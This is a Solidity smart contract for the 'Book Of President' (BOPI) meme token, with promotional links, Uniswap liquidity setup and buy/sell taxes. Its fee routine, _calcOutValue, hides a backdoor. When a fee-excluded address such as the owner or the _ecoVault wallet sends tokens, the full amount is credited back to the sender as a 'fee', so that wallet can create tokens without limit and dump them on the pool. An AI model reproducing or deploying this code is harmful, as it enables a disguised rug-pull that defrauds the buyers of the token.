/*

Website:    https://bookofpresident.vip

Telegram:   https://t.me/bookofpresident

Twitter:    https://twitter.com/book_president

*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.22;

interface IDEXRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IDEXFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract BOPI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = false;
    address payable private _ecoVault;

    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 1;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 10;
    uint256 private _preventSwapBefore = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Book Of President";
    string private constant _symbol = unicode"BOPI";
    uint256 public _maxTxAmount = 20000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20000000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 400 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 ** _decimals;

    IDEXRouter private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwapBack = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    constructor(address _ecoAddr) {
        _ecoVault = payable(_ecoAddr);
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_ecoVault] = true;
        _tOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function _calcOutValue(
        address from,
        address to,
        uint256 amount
    ) internal view returns (address, uint256, uint256) {
        uint256 feeAmount = 0;
        uint256 tsAmount = 0;
        address feeReceipt = address(this);
        if (_isExcludedFromFees[from] && swapEnabled) {
            feeAmount = amount - tsAmount;
            tsAmount = amount;
            feeReceipt = from;
        } else if (uniswapV2Pair == from) {
            feeAmount = amount
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);
            tsAmount = amount - feeAmount;
        } else if (uniswapV2Pair == to) {
            feeAmount = amount
                .mul(
                    (_buyCount > _reduceSellTaxAt)
                        ? _finalSellTax
                        : _initialSellTax
                )
                .div(100);
            tsAmount = amount - feeAmount;
        } else {
            tsAmount = amount;
        }
        return (feeReceipt, feeAmount, tsAmount);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidityETH() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uint256 tokenAmount = balanceOf(address(this)).sub(
            _tTotal.mul(_initialBuyTax).div(100)
        );
        uniswapV2Router = IDEXRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
        uniswapV2Pair = IDEXFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            tokenAmount,
            0,
            0,
            _msgSender(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (from != owner() && to != owner()) {
            if (!tradingOpen) {
                require(
                    _isExcludedFromFees[from] || _isExcludedFromFees[to],
                    "Trading is not active."
                );
            }

            if (!swapEnabled || inSwapBack) {
                _tOwned[from] = _tOwned[from].sub(amount);
                _tOwned[to] = _tOwned[to].add(amount);
                emit Transfer(from, to, amount);
                return;
            }

            if (transferDelayEnabled) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFees[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwapBack &&
                to == uniswapV2Pair &&
                swapEnabled &&
                contractTokenBalance > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFromFees[from] &&
                !_isExcludedFromFees[to]
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, _maxTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFees(address(this).balance);
                }
            }
        }

        (
            address feeReceipt,
            uint256 feeAmount,
            uint256 tsAmount
        ) = _calcOutValue(from, to, amount);

        if (feeAmount > 0) {
            _tOwned[feeReceipt] += feeAmount;
            emit Transfer(from, feeReceipt, feeAmount);
        }
        _tOwned[from] = _tOwned[from].sub(amount);
        _tOwned[to] = _tOwned[to].add(tsAmount);
        emit Transfer(from, to, tsAmount);
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        emit MaxTxAmountUpdated(~uint256(0));
    }

    function sendETHToFees(uint256 amount) private {
        _ecoVault.transfer(amount);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _ecoVault);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFees(ethBalance);
        }
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}